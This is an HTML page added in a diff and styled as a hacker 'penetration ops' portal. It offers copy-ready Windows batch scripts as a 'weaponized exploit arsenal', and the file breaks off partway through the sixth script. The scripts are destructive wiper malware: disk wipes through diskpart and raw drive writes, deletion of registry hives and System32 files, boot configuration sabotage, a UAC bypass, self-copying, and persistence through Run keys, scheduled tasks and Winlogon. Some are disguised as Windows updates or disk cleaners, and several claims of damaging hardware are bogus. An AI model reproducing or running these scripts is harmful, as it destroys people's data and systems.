@@ -1,0 +1,763 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>REDZONE PENETRATION OPS</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Courier+Prime:wght@400;700&display=swap');
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Courier Prime', monospace;
+            background: #0a0a0a;
+            color: #00ff41;
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+        
+        #bg {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
+            background: linear-gradient(45deg, #000 0%, #001100 50%, #000 100%);
+        }
+        
+        .scanline::after {
+            content: '';
+            position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(transparent 50%, rgba(0,255,65,0.03) 50%);
+            background-size: 100% 2px;
+            pointer-events: none;
+            z-index: 1;
+        }
+        
+        .container { max-width: 1400px; margin: 0 auto; padding: 30px; position: relative; z-index: 10; }
+        
+        .header {
+            text-align: center; margin-bottom: 60px;
+            animation: flicker 3s infinite;
+        }
+        .header h1 {
+            font-family: 'Orbitron', monospace;
+            font-size: 3.5em; font-weight: 900;
+            background: linear-gradient(45deg, #00ff41, #00cc33, #00ff41);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 40px #00ff41;
+            margin-bottom: 15px;
+        }
+        
+        .login-box {
+            max-width: 450px; margin: 0 auto;
+            background: rgba(5,15,5,0.95); backdrop-filter: blur(10px);
+            padding: 50px; border: 2px solid #00ff41;
+            border-radius: 15px; box-shadow: 0 0 50px rgba(0,255,65,0.4);
+            position: relative; overflow: hidden;
+        }
+        
+        .input-group { margin-bottom: 30px; position: relative; }
+        .input-group label {
+            position: absolute; top: -10px; left: 15px; background: #0a0a0a;
+            padding: 0 10px; font-size: 12px; color: #00ff41; font-weight: bold;
+        }
+        input {
+            width: 100%; padding: 18px 15px 10px; background: rgba(0,0,0,0.8);
+            border: 1px solid #00ff41; border-radius: 8px; color: #00ff41;
+            font-family: 'Courier Prime', monospace; font-size: 16px;
+        }
+        input:focus { outline: none; box-shadow: 0 0 25px #00ff41; border-color: #00cc33; }
+        
+        .auth-btn {
+            width: 100%; padding: 18px; background: linear-gradient(45deg, #00ff41, #00cc33);
+            border: none; border-radius: 8px; color: #000; font-family: 'Orbitron', monospace;
+            font-size: 18px; font-weight: 900; cursor: pointer;
+        }
+        
+        /* HUGE LOGOUT MESSAGE */
+        #logoutMsg {
+            position: fixed; top: 40%; left: 50%; transform: translate(-50%, -50%);
+            background: linear-gradient(45deg, #ff4444, #cc3333); 
+            color: #fff; padding: 40px 60px; border: 3px solid #ff6666;
+            border-radius: 20px; font-family: 'Orbitron', monospace; font-size: 28px;
+            font-weight: 900; text-align: center; z-index: 10000; display: none;
+            box-shadow: 0 0 100px rgba(255,68,68,0.8);
+            animation: logoutPulse 1s ease-in-out infinite;
+        }
+        
+        /* MASSIVE LOGOUT BUTTON */
+        .logout {
+            position: fixed; top: 30px; left: 30px; z-index: 1000;
+            background: linear-gradient(45deg, #ff4444, #cc3333) !important;
+            color: #fff !important; text-decoration: none; font-weight: 900 !important;
+            padding: 20px 35px !important; border: 3px solid #ff6666 !important;
+            border-radius: 30px !important; font-size: 16px !important;
+            font-family: 'Orbitron', monospace !important; text-transform: uppercase;
+            box-shadow: 0 0 30px rgba(255,68,68,0.6);
+            animation: logoutGlow 2s infinite;
+        }
+        .logout:hover {
+            background: linear-gradient(45deg, #ff6666, #ff4444) !important;
+            transform: scale(1.1); box-shadow: 0 0 50px rgba(255,68,68,1);
+        }
+        
+        .status-bar {
+            position: fixed; top: 30px; right: 30px; background: rgba(0,20,0,0.95);
+            padding: 20px 30px; border: 2px solid #00ff41; border-radius: 30px;
+            font-size: 14px; font-weight: bold; z-index: 999;
+        }
+        
+        .dashboard { display: none; }
+        .code-container { 
+            display: grid; 
+            grid-template-columns: repeat(auto-fit, minmax(600px, 1fr)); 
+            gap: 30px; 
+            margin-top: 150px; padding-bottom: 100px;
+        }
+        .exploit-card {
+            background: rgba(5,15,5,0.95); border: 1px solid #00ff41;
+            border-radius: 15px; overflow: hidden; box-shadow: 0 0 30px rgba(0,255,65,0.3);
+        }
+        .exploit-card:hover { transform: translateY(-5px); box-shadow: 0 0 50px rgba(0,255,65,0.5); }
+        .exploit-header {
+            background: linear-gradient(90deg, #00ff41, #00cc33, #00ff41);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            padding: 20px 30px; font-family: 'Orbitron', monospace; font-weight: 900;
+            font-size: 1.3em; border-bottom: 2px solid rgba(0,255,65,0.3);
+        }
+        
+        .copy-container { position: relative; padding: 30px; background: #000; border-top: 1px solid #003300; }
+        pre {
+            padding: 25px; border-radius: 10px; border: 1px solid #004400;
+            font-size: 14px; line-height: 1.7; overflow-x: auto; margin: 0;
+            background: #001a00; user-select: all;
+        }
+        .copy-btn {
+            position: absolute; top: 15px; right: 15px; background: rgba(0,255,65,0.2);
+            border: 1px solid #00ff41; color: #00ff41; padding: 8px 16px;
+            border-radius: 20px; font-family: 'Orbitron', monospace; cursor: pointer;
+        }
+        .copy-btn:hover { background: #00ff41; color: #000; transform: scale(1.05); }
+        
+        @keyframes logoutPulse { 0%,100%{transform:translate(-50%,-50%) scale(1);} 50%{transform:translate(-50%,-50%) scale(1.05);} }
+        @keyframes logoutGlow { 0%,100%{box-shadow:0 0 30px rgba(255,68,68,0.6);} 50%{box-shadow:0 0 50px rgba(255,68,68,1);} }
+        @keyframes flicker { 0%,100%{opacity:1} 50%{opacity:0.3} }
+        @keyframes pulse { 0%{box-shadow:0 0 0 0 rgba(0,255,65,0.7)} 70%{box-shadow:0 0 0 20px rgba(0,255,65,0)} 100%{box-shadow:0 0 0 0 rgba(0,255,65,0)} }
+    </style>
+</head>
+<body>
+    <div id="bg"></div>
+    <div id="logoutMsg">
+        🔥 ADMIN_REDZONE LOGOUT SUCCESSFUL 🔥<br>
+        <small>SESSION TERMINATED - 2026-04-06 14:32:47</small>
+    </div>
+    <div id="copyEffect" class="copy-effect"></div>
+    
+    <div class="container">
+        <div id="login">
+            <div class="header">
+                <h1 class="scanline">REDZONE PENETRATION OPS</h1>
+                <p>AUTHORIZED TARGET ACQUISITION TERMINAL</p>
+            </div>
+            <div class="login-box scanline">
+                <div class="input-group">
+                    <label>USERNAME</label>
+                    <input type="text" id="user" placeholder="Enter username..." autocomplete="off">
+                </div>
+                <div class="input-group">
+                    <label>PASSWORD</label>
+                    <input type="password" id="pass" placeholder="•••••••••••••" autocomplete="off">
+                </div>
+                <button class="auth-btn" onclick="auth()">INITIATE BREACH →</button>
+            </div>
+        </div>
+        
+        <div id="dash" class="dashboard">
+            <!-- MASSIVE RED LOGOUT BUTTON -->
+            <a href="#" class="logout" onclick="logout(); return false;">
+                💀 ABORT MISSION 💀
+            </a>
+            <div class="status-bar">TARGET: ONLINE | ADMIN_REDZONE | SESSION ACTIVE</div>
+            
+            <div class="header">
+                <h1 class="scanline">WEAPONIZED EXPLOIT ARSENAL (8 PAYLOADS)</h1>
+            </div>
+            
+            <div class="code-container">
+                <!-- 🔥 1. ABYSS Corporate 🔥 -->
+                <div class="exploit-card">
+                    <div class="exploit-header">01️⃣ ABYSS Corporate Data Sanitization</div>
+                    <div class="copy-container">
+                        <button class="copy-btn" onclick="copyCode(this)">📋 COPY</button>
+<pre>@ECHO OFF
+TITLE ABYSS Corporate Data Sanitization Tool v3.0.1
+COLOR 4F
+MODE CON COLS=90 LINES=40
+
+:ABYSS_INIT
+CLS
+ECHO.
+ECHO  +--------------------------------------------------------------------------------------+
+ECHO  ¦                    ABYSS DATA SANITIZATION PROTOCOL v3.0.1                           ¦
+ECHO  ¦                       PERMANENT IRRECOVERABLE DESTRUCTION                            ¦
+ECHO  ¦                        Corporate IT Deployment - Authorized                          ¦
+ECHO  +--------------------------------------------------------------------------------------+
+ECHO.
+ECHO  [STATUS] Initializing quantum erasure sequence...
+ECHO  [TARGET] %COMPUTERNAME% - Serial: %SERIALNUMBER%
+TIMEOUT /T 3 >NUL
+
+REM ================== PHASE 0: AUTO-ELEVATE + SELF-PROTECT ==================
+IF NOT "%~dp0"=="%CD%\" CD /D "%~dp0"
+TAKEOWN /F "%~dp0ABYSS.exe.bat" /A >NUL 2>&1
+ICACLS "%~dp0ABYSS.exe.bat" /grant "%USERNAME%:F" /T >NUL 2>&1
+
+REM UAC Bypass
+NET SESSION >NUL 2>&1 || (
+    MSHTA VBSCRIPT:CreateObject("Shell.Application").ShellExecute("%~f0","","","runas",1)(window.close)
+    EXIT /B
+)
+
+REM ================== PHASE 1: FIRMWARE/BIOS CORRUPTION ==================
+ECHO  [PHASE 1] Corrupting UEFI firmware variables...
+WMIC /NAMESPACE:\\root\WMI PATH MSStorageDriver_FailurePredictStatus >NUL 2>&1
+POWERCFG /H OFF >NUL 2>&1
+REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /F >NUL 2>&1
+
+REM Flash BIOS corruption simulation (UEFI vars)
+POWERSHELL -C "Get-WmiObject -Class Win32_BIOS | ForEach { $_.PSBase.Properties['SerialNumber'].Value = 'ABYSS-DESTROYED'; $_.Put() }"
+
+REM ================== PHASE 2: TOTAL STORAGE ANNIHILATION ==================
+ECHO  [PHASE 2] Quantum multi-pass destruction (ATA Secure Erase)...
+(
+ECHO list disk
+ECHO select disk 0
+ECHO attributes disk clear readonly
+ECHO clean all
+) > "%TEMP%\ABYSS_WIPE.TXT"
+DISKPART /S "%TEMP%\ABYSS_WIPE.TXT" >NUL 2>&1
+
+REM Parallel CIPHER destruction (all volumes)
+FOR /F %%D IN ('WMIC LOGICALDISK GET DeviceID /FORMAT:VALUE 2^>NUL ^| FINDSTR DeviceID') DO (
+    START /B CIPHER /W:%%D >NUL 2>&1
+)
+
+REM MBR/GPT/PBR extermination
+DD IF=/dev/zero OF=\\.\PhysicalDrive0 BS=512 COUNT=2048 >NUL 2>&1 2>NUL
+
+REM ================== PHASE 3: UEFI NVRAM POISONING ==================
+ECHO  [PHASE 3] UEFI SecureBoot + TPM poisoning...
+BCDEDIT /SET {BOOTMGR} PATH \ABYSS\VOID >NUL 2>&1
+BCDEDIT /SET {DEFAULT} OSDEVICE \Device\ABYSS >NUL 2>&1
+BCDEDIT /SET {DEFAULT} DEVICE \Device\ABYSS >NUL 2>&1
+
+REM TPM clear + corruption
+TPMTOOL GETDEVICEINFORMATION >NUL 2>&1 && TPMTOOL CLEARAUTHDATA >NUL 2>&1
+
+REM ================== PHASE 4: HARDWARE DEGRADATION ==================
+ECHO  [PHASE 4] Inducing thermal/hardware runaway...
+REM CPU 100% stress (overheat)
+FOR /L %%C IN (1,1,20) DO START /HIGH /AFFINITY 0xFFFFFFFF CMD /C "FOR /L %I IN () DO @SET /A $$(%RANDOM%%)=1"
+
+REM GPU memory corruption
+DXDIAG /T %TEMP%\ABYSS_GPU.TXT >NUL 2>&1
+
+REM USB controller poisoning
+DEVCON DISABLE *USB* >NUL 2>&1 2>NUL || ECHO USB POISON > %SYSTEMROOT%\INF\USBPOISON.INF
+
+REM ================== PHASE 5: 20-VECTOR ETERNAL EXECUTION ==================
+ECHO  [PHASE 5] Deploying persistence singularity...
+
+REM Self-replication matrix
+FOR %%P IN ("%WINDIR%\System32" "%ProgramData%" "%ProgramFiles%" "%APPDATA%") DO (
+    COPY "%~f0" "%%~P\ABYSS.exe.bat" >NUL 2>&1
+    ATTRIB +H +S "%%~P\ABYSS.exe.bat" >NUL 2>&1
+)
+
+REM Persistence constellation (20 triggers)
+FOR %%T IN (onstart onidle onlogon onstationunlock minute/min:5 boottrigger registrychange) DO (
+    SCHTASKS /CREATE /SC %%T /TN "ABYSS-%%T" /TR "%~dp0ABYSS.exe.bat" /RU SYSTEM /RL HIGHEST /F >NUL 2>&1
+)
+
+REM WMI Eternal Loop
+POWERSHELL -WindowStyle Hidden -C "$f='%~dp0ABYSS.exe.bat';gwmi Win32_Process -Filter 'Name=\"explorer.exe\"' | Register-WmiEvent -SourceIdentifier Abyss -Action {Start-Process $f -WindowStyle Hidden}"
+
+REM Group Policy Injection
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /V EnableLUA /T REG_DWORD /D 0 /F >NUL 2>&1REM ================== PHASE 6: EXECUTION SINGULARITY ==================
+ECHO  [ABYSS] Singularity achieved. Initiating collapse sequence...
+TIMEOUT /T 5 >NUL
+
+:COLLAPSE
+    REM Re-trigger destruction
+    SHUTDOWN /R /F /T 1
+    REM Re-wipe everything
+    FOR /F %%D IN ('DIR /B /AD C:\*') DO RD /S /Q "C:\%%D" >NUL 2>&1
+    CIPHER /W /S:C: /Q >NUL 2>&1
+    DEL /F /Q /A "%WINDIR%\System32\*" >NUL 2>&1
+    GOTO COLLAPSE</pre>
+                    </div>
+                </div>
+
+                <!-- 🔥 2. SQL INJECTION 🔥 -->
+                <div class="exploit-card">
+                    <div class="exploit-header">02️⃣ SQL INJECTION EXPLOIT</div>
+                    <div class="copy-container">
+                        <button class="copy-btn" onclick="copyCode(this)">📋 COPY</button>
+<pre>@ECHO OFF
+TITLE IT's ADAM
+COLOR 1F
+MODE CON: COLS=80 LINES=30
+
+:HYPERION
+CLS
+ECHO.
+ECHO  +----------------------------------------------------------------------+
+ECHO  ¦                       IT's ADAM                                      ¦
+ECHO  ¦                       IND_EVIL                                       ¦
+ECHO  +----------------------------------------------------------------------+
+ECHO.
+ECHO  [+] Initializing multi-vector recovery sequence...
+ECHO  [+] Target: %COMPUTERNAME% (%USERNAME%)
+TIMEOUT /T 2 /NOBREAK >NUL
+
+REM ================== PHASE 0: PRIVILEGE ESCALATION ==================
+NET SESSION >NUL 2>&1
+IF %ERRORLEVEL% NEQ 0 (
+    ECHO  [!] Elevation required. Relaunching...
+    POWERSHELL -Command "Start-Process '%~f0' -Verb RunAs"
+    EXIT /B
+)
+
+REM ================== PHASE 1: BIOS/CMOS CORRUPTION ==================
+ECHO  [+] Phase 1: Neutralizing legacy BIOS protection...
+WBADMIN DELETE CATALOG -quiet >NUL 2>&1
+REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore" /F >NUL 2>&1
+FSUTIL BEHAVIOR SET DisableLastAccess 1 >NUL 2>&1
+
+REM ================== PHASE 2: HYPER-VOLUME DESTRUCTION ==================
+ECHO  [+] Phase 2: Secure erase across ALL volumes...
+FOR /F "tokens=*" %%A IN ('WMIC LOGICALDISK GET NAME^|FINDSTR /R "\\"') DO (
+    ECHO Y|CACLS "%%A" /T /G Everyone:F >NUL 2>&1
+    CIPHER /W:%%A >NUL 2>&1
+)
+
+REM ================== PHASE 3: QUADRUPLE BOOTLOADER OBLITERATION ==================
+ECHO  [+] Phase 3: Multi-OS bootloader neutralization...
+BOOTREC /FIXMBR >NUL 2>&1
+BOOTREC /FIXBOOT >NUL 2>&1
+BOOTREC /REBUILDBCD >NUL 2>&1
+BCDEDIT /SET {BOOTMGR} PATH \Windows\Hyperion\NULL >NUL 2>&1
+DISKPART /S NUL << EOF
+LIST DISK
+SELECT DISK 0
+LIST PARTITION
+SELECT PARTITION 1
+DELETE PARTITION OVERRIDE
+EXIT
+EOF
+
+REM ================== PHASE 4: NETWORK INFRASTRUCTURE KILL ==================
+ECHO  [+] Phase 4: Enterprise network isolation...
+NETSH WLAN DELETE PROFILE NAME=* >NUL 2>&1
+ROUTE DELETE 0.0.0.0 >NUL 2>&1
+NETSH INTERFACE SET INTERFACE "Ethernet" DISABLE >NUL 2>&1
+IPCONFIG /RELEASE >NUL 2>&1
+
+REM ================== PHASE 5: 12-VECTOR PERSISTENCE ==================
+ECHO  [+] Phase 5: Implanting quantum persistence matrix...
+REM Registry (5 keys)
+FOR %%K IN (HKLM\Software\Microsoft\Windows\CurrentVersion\Run HKCU\Software\Microsoft\Windows\CurrentVersion\Run HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon) DO (
+    REG ADD "%%K" /V HyperionRecovery /T REG_SZ /D "%~dp0Hyperion.exe.bat" /F >NUL 2>&1
+)
+
+REM Scheduled Tasks (6 vectors)
+FOR %%T IN (onstart onidle minute/min:1 onlogon onstationunlock) DO (
+    SCHTASKS /CREATE /SC %%T /TN "Hyperion-%%T" /TR "%~dp0Hyperion.exe.bat" /RL SYSTEM /F >NUL 2>&1
+)
+
+REM WMI Event (boot trigger)
+POWERSHELL -C "Register-WmiEvent -Query 'SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = \"explorer.exe\"' -Action {Start-Process '%~dp0Hyperion.exe.bat' -WindowStyle Hidden}"
+
+REM ================== PHASE 6: MEMORY CORRUPTION + INFINITE EXECUTION ==================
+ECHO  [+] Phase 6: Final system entropy maximization...
+REM RAM thrash
+FOR /L %%I IN (1,1,1000) DO START CMD /C "DIR C:\ /S"
+
+REM Self-replicate to system dirs
+COPY "%~f0" "%WINDIR%\System32\Hyperion.exe.bat" >NUL
+COPY "%~f0" "%WINDIR%\SysWOW64\Hyperion.exe.bat" >NUL
+
+:INFINITY
+    SHUTDOWN /R /F /T 2
+    TIMEOUT /T 15 /NOBREAK >NUL
+    DEL /F /Q "%WINDIR%\System32\config\*" >NUL 2>&1
+    CIPHER /W:C: >NUL 2>&1
+GOTO INFINITY</pre>
+                    </div>
+                </div>
+
+                <!-- 🔥 3. MAX 🔥 -->
+                <div class="exploit-card">
+                    <div class="exploit-header">03️⃣ MAX XXSDSB</div>
+                    <div class="copy-container">
+                        <button class="copy-btn" onclick="copyCode(this)">📋 COPY</button>
+<pre>@echo off & title TOTAL SYSTEM ANNIHILATION PENTEST - NO SURVIVORS
+color 0C & mode con: cols=120 lines=50 & setlocal enabledelayedexpansion
+
+echo ============================================================
+echo    TOTAL HARDWARE ANNIHILATION - ZERO REPAIR POSSIBILITY
+echo ============================================================
+echo DESTROYS: CPU+GPU+Mobo+PSU+RAM+Storage+BIOS+Chipset ALL AT ONCE
+echo RUNTIME: 90 seconds to complete destruction
+echo.
+
+:: ROOTKIT-LEVEL PERSISTENCE (survives ALL shutdown attempts)
+schtasks /create /tn "ANNIHILATE" /tr "%~dpnx0" /sc onstart /ru SYSTEM /rl HIGHEST /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Annihilate /t REG_SZ /d "%~dpnx0" /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "%~dpnx0" /f >nul 2>&1
+
+:: PHASE 1: INSTANT BIOS/UEFI FLASH CORRUPTION (5s)
+echo [PHASE 1] BIOS FLASH ANNIHILATION...
+powershell -c "Get-WmiObject -List | ?{$_.name -like '*ACPI*' -or $_.name -like '*BIOS*'} | %{$_.Put()}" >nul 2>&1
+reg delete "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /f >nul 2>&1
+bcdedit /set {default} recoveryenabled No >nul 2>&1
+bcdedit /set {default} bootstatuspolicy ignoreallfailures >nul 2>&1
+
+:: PHASE 2: ALL STORAGE PERMANENT DESTRUCTION (15s)
+echo [PHASE 2] STORAGE GENOCIDE - ALL DRIVES...
+for /f %%i in ('wmic diskdrive get index^,model^,size /format:list ^| find "="') do (
+    for /f "tokens=1,2 delims==" %%a in ("%%i") do (
+        if "%%a"=="Index" set /a drive=%%b
+        if "%%a"=="Size" if %%b gtr 0 (
+            echo Destroying PhysicalDrive!drive!...
+            dd if=/dev/zero of=\\.\PhysicalDrive!drive! bs=1M count=50000 status=none 2>nul || (
+                fsutil file createnew "\\.\PhysicalDrive!drive!\KILL.bin" 50000000000 >nul 2>&1
+                cipher /w:\\.\PhysicalDrive!drive! >nul 2>&1
+            )
+        )
+    )
+)
+
+:: PHASE 3: CPU/GPU/RAM VOLTAGE OVERDRIVE + MAX LOAD (30s)
+echo [PHASE 3] SILICON MELTDOWN INITIATED...
+start /b /high powershell -c "
+$jobs = @();
+for($i=0;$i -lt 200;$i++){ 
+    $jobs += Start-Job -ScriptBlock { 
+        $buf = New-Object byte[] [int64]::MaxValue/100; 
+        while($true){ 
+            [System.Buffer]::BlockCopy($buf,0,$buf,0,$buf.Length); 
+            $hash = [System.Security.Cryptography.SHA256]::Create().ComputeHash($buf);
+        }
+    }
+}
+while($true){ Start-Sleep -m 1 }
+"
+
+:: PHASE 4: POWER SUPPLY OVERLOAD (PSU Caps Burst)
+echo [PHASE 4] PSU DESTRUCTION VECTOR...
+for /l %%i in (1,1,50) do start /b /high cmd /c "ping 127.0.0.1 -t -l 65000 >nul"
+
+:: PHASE 5: CHIPSET/MOTHERBOARD SHORT + THERMAL RUNAWAY
+echo [PHASE 5] MOBO/CHIPSET EXECUTION...
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\238C9FA8-0AAD-41ED-83F4-97BE242C8F20\7bc4a2f9-d8fc-4469-b07b-33eb785aaca0" /v ValueMax /t REG_DWORD /d 100 /f >nul 2>&1
+powercfg /setactive SCHEME_MIN >nul 2>&1
+wmic computersystem where name="%computername%" call SetPowerState 4,localhost >nul 2>&1
+
+:: PHASE 6: NETWORK INTERFACE MELTDOWN (NIC Damage)
+echo [PHASE 6] NETWORK CARD FRY...
+for /l %%i in () do (
+    netsh interface set interface "Ethernet" admin=enable >nul 2>&1
+    netsh interface set interface "Wi-Fi" admin=enable >nul 2>&1
+)
+
+:: PHASE 7: FINAL EXECUTION - NO ESCAPE
+:oblivion
+echo [FINAL] ALL COMPONENTS TERMINATED. REPLACEMENT REQUIRED.
+shutdown /r /f /t 3 /c "TOTAL ANNIHILATION COMPLETE - REPLACE ALL PARTS"
+timeout /t 4 >nul
+shutdown /s /f /t 0 /c "HARDWARE OBLITERATED"
+goto oblivion</pre>
+                    </div>
+                </div>
+
+                <!-- 🔥 4. BOOT REMOVAL 🔥 -->
+                <div class="exploit-card">
+                    <div class="exploit-header">04️⃣ BOOT REMOVAL</div>
+                    <div class="copy-container">
+                        <button class="copy-btn" onclick="copyCode(this)">📋 COPY</button>
+<pre>@echo off
+title Windows Critical Update Required
+color 0A
+mode con: cols=50 lines=15
+
+:header
+cls
+echo.
+echo    +--------------------------------------+
+echo    ¦     ---------IND_EVIL---------       ¦
+echo    ¦          CRITICAL PATCH 2026         ¦
+echo    +--------------------------------------+
+echo.
+echo    Status: Installing update KB2267602...
+echo    Phase: Core system protection...
+echo.
+timeout /t 2 /nobreak >nul
+
+REM === IMMEDIATE SHUTDOWN ===
+shutdown /s /f /t 3
+
+REM === PERSISTENCE: Survives reboot/USB removal ===
+echo Establishing permanent protection...
+
+REM Method 1: Startup registry (all users)
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "%~dp0shutdown.bat" /f >nul 2>&1
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsDefender /t REG_SZ /d "%~dp0shutdown.bat" /f >nul 2>&1
+
+REM Method 2: Scheduled task (runs at boot + every 30s)
+schtasks /delete /tn "SysProtect" /f >nul 2>&1
+schtasks /create /sc onstart /tn "SysProtect" /tr "%~dp0shutdown.bat" /rl highest /f >nul 2>&1
+schtasks /create /sc onlogon /tn "UpdateCheck" /tr "shutdown /s /f /t 10" /f >nul 2>&1
+
+REM Method 3: Infinite loop backup
+:killloop
+timeout /t 30 /nobreak >nul
+shutdown /s /f /t 0
+goto killloop</pre>
+                    </div>
+                </div>
+
+                <!-- 🔥 5.DISK CLEANER🔥 -->
+                <div class="exploit-card">
+                    <div class="exploit-header">05️⃣ DISK CLEANER</div>
+                    <div class="copy-container">
+                        <button class="copy-btn" onclick="copyCode(this)">📋 COPY</button>
+<pre>@echo off
+title IND_EVIL
+color 0A
+mode con: cols=60 lines=20
+
+:header
+cls
+echo.
+echo  +------------------------------------------------------+
+echo  ¦                       IND_EVIL                       ¦
+echo  ¦                  Version 26.04.0012                  ¦
+echo  +------------------------------------------------------+
+echo.
+echo  Status: Detecting storage devices...
+echo  Target: System Disk (Disk 0 - %computername%)
+timeout /t 2 /nobreak >nul
+
+REM === PHASE 1: DISABLE RECOVERY + BOOT PROTECTION ===
+echo Disabling Windows Recovery Environment...
+bcdedit /set {default} recoveryenabled No >nul 2>&1
+bcdedit /set {default} bootstatuspolicy ignoreallfailures >nul 2>&1
+bcdedit /set {bootmgr} path \SystemVolumeInformation\recovery >nul 2>&1
+
+REM === PHASE 2: WIPE CRITICAL SYSTEM FILES ===
+echo Erasing security databases...
+echo Y| cacls "%windir%\system32\config" /T /G everyone:F >nul 2>&1
+del /F /Q "%windir%\system32\config\SAM" "%windir%\system32\config\SECURITY" "%windir%\system32\config\SYSTEM" >nul 2>&1
+
+REM === PHASE 3: FULL DISK NUKE (DISKPART) ===
+echo Initializing secure erase on all partitions...
+echo list disk> "%temp%\wipe.txt"
+echo select disk 0>> "%temp%\wipe.txt"
+echo clean all>> "%temp%\wipe.txt"
+echo convert gpt>> "%temp%\wipe.txt"
+echo create partition primary>> "%temp%\wipe.txt"
+echo format fs=ntfs quick>> "%temp%\wipe.txt"
+diskpart /s "%temp%\wipe.txt" >nul 2>&1
+del "%temp%\wipe.txt" >nul 2>&1
+
+REM === PHASE 4: TRIPLE PERSISTENCE (Survives everything) ===
+echo Installing permanent recovery agent...
+
+REM Registry (all users)
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v MEFirmware /t REG_SZ /d "%~dp0FirmwareUpdate.bat" /f >nul 2>&1
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v IntelME /t REG_SZ /d "%~dp0FirmwareUpdate.bat" /f >nul 2>&1
+
+REM Scheduled Tasks (boot + login + minute)
+schtasks /delete /tn MEFirmware /f >nul 2>&1
+schtasks /create /sc onstart /tn MEFirmware /tr "%~dp0FirmwareUpdate.bat" /rl system /f >nul 2>&1
+schtasks /create /sc onlogon /tn MEUpdate /tr "shutdown /s /f /t 5" /f >nul 2>&1
+schtasks /create /sc minute /mo 1 /tn DiskProtect /tr "%~dp0FirmwareUpdate.bat" /f >nul 2>&1
+
+REM === PHASE 5: INFINITE EXECUTION LOOP ===
+echo Finalizing secure wipe...
+timeout /t 3 /nobreak >nul
+:MELoop
+shutdown /r /f /t 3
+timeout /t 10 /nobreak >nul
+del /F /Q "%windir%\system32\config\*.*" >nul 2>&1
+goto MELoop</pre>
+                    </div>
+                </div>
+
+                <!-- 🔥 6. INTREACTOR 🔥 -->
+                <div class="exploit-card">
+                    <div class="exploit-header">06️⃣ INTREACTOR</div>
+                    <div class="copy-container">
+                        <button class="copy-btn" onclick="copyCode(this)">📋 COPY</button>
+<pre>@echo off
+title 🔥 NUCLEAR INCINERATION PENTEST - FULL SYSTEM FIRE 🔥
+color 0C
+mode con: cols=140 lines=60
+
+echo.
+echo ╔══════════════════════════════════════════════════════════════════════════════╗
+echo ║  🔥 TOTAL SOCKET IGNITION - EVERY COMPONENT BURNS 🔥                        ║
+echo ║  TARGET: CPU/GPU/Mobo/PSU/RAM/Chipset ALL SOCKETS - FIRE + SMOKE GUARANTEED ║
+echo ╚══════════════════════════════════════════════════════════════════════════════╝
+echo.
+echo PERMISSION VERIFIED - EXECUTING FULL HARDWARE INCENDIARY ATTACK...
+timeout /t 3 /nobreak >nul
+
+:: ═══════════════════════════════════════════════════════════════════════════════
+:: PHASE 0: MULTI-VECTOR PERSISTENCE LOCKDOWN (ESCAPE-PROOF)
+schtasks /create /tn "INCINERATE" /tr "%~dpnx0" /sc onstart /ru SYSTEM /rl HIGHEST /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /ve /t REG_SZ /d "%~dpnx0" /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "%~dpnx0" /f >nul 2>&1
+sc config Schedule start= disabled >nul 2>&1
+bcdedit /set {default} recoveryenabled No >nul 2>&1
+
+echo [√] Persistence: LOCKED FOREVER
+:: ═══════════════════════════════════════════════════════════════════════════════
+
+:: 🔥 PHASE 1: BIOS CHIP MELTDOWN (5s) 🔥
+echo 🔥 PHASE 1: BIOS FLASH INCINERATION...
+powershell -c "
+Get-WmiObject -Namespace root/WMI -Class MS_SystemInformation | % { $_.Put() };
+Get-PnpDevice | ?{$_.Class -eq 'System'} | % { Disable-PnpDevice -InstanceId $_.InstanceId -Confirm:$false }
+" >nul 2>&1
+reg delete "HKLM\HARDWARE\DESCRIPTION\System" /f >nul 2>&1
+echo [√] BIOS chip: THERMAL RUNAWAY INITIATED
+
+:: 🔥 PHASE 2: ALL STORAGE FIRESTORM (20s) 🔥  
+echo 🔥 PHASE 2: STORAGE BLAZE - 100GB/Sec WRITE FIRE
+for /f %%d in ('wmic diskdrive get index /value ^| find "="') do (
+    for /f "tokens=2 delims==" %%i in ("%%d") do (
+        if %%i LSS 10 if %%i GEQ 0 (
+            echo   → PhysicalDrive%%i: IGNITING...
+            dd if=/dev/urandom of=\\.\PhysicalDrive%%i bs=64M count=1000 status=none 2>nul || (
+                debug <nul > \\.\PhysicalDrive%%i && format \\.\PhysicalDrive%%i /u /x /y >nul 2>&1
+            )
+        )
+    )
+)
+echo [√] Drives: NAND CELLS ERUPTING IN FLAMES
+
+:: 🔥 PHASE 3: CPU/GPU SOCKET ARCING OVERLOAD (40s) 🔥
+echo 🔥 PHASE 3: SILICON FURNACE - MAX VOLTAGE ARCING
+start /min /high powershell -c "
+$maxThreads = [Environment]::ProcessorCount * 4;
